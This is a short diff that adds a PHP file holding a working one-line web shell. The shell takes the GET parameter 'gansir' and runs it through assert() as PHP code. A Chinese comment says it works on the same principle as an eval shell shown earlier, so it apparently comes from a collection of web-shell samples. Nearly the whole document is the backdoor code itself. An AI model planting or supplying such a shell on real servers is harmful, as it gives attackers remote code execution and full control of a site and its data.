@@ -1,0 +1,7 @@
+<?php
+if(isset($_GET['gansir'])){
+$gansir=$_GET['gansir'];
+assert("\$gansir = $gansir;");
+}
+?>
+原理和上面的eval一样
